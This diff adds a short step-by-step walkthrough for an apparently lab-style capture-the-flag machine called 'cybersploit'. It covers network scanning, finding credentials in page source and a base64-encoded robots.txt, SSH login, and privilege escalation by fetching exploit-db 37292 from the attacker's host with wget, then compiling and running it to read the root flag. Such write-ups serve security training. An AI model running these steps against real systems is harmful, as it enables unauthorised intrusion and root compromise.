@@ -1,0 +1,42 @@
+1. -> nmap -sn 192.168.x.x
+
+
+2. -> nmap -sV -sC -A -p- 192.168.x.x
+
+
+3. -> dirb http://192.168.x.x/
+
+
+4. -> Access http://192.168.x.x/ source code, press ctrl+f 'type username' ( you'll get username )
+
+
+5. -> cat > robots.txt  ( convert base64 encoded msg to a txt string...you'll get passwd for ssh user )
+
+
+6. -> ssh itsskv@cybersploit
+
+
+7. -> ls 
+   -> cat flag2.txt  ( convert encoded msg inside of flag2 into a txt string )
+
+
+8. -> uname -a ( see generic version )
+
+
+9. -> searchsploit 3.13.0-32  "OR"  search on browser linux 3.13.0-32 exploit ( https://www.exploit-db.com/exploits/37292 )
+
+
+10. Go to the user home dir then downloads and host a http server via python 
+    -> for python2 : python2 -m SimpleHTTPserver 1234  <port no> 
+    -> for python3 : python3 -m http.server 1234       <port no>       
+
+
+11. Now on target machine go to user home dir type 
+    -> wget http://192.168.x.x:1234/37292.c
+
+
+12. -> gcc 37292.c -o exploit 
+    -> ./exploit
+    -> cd /root 
+    -> ls
+    -> cat finalflag.txt
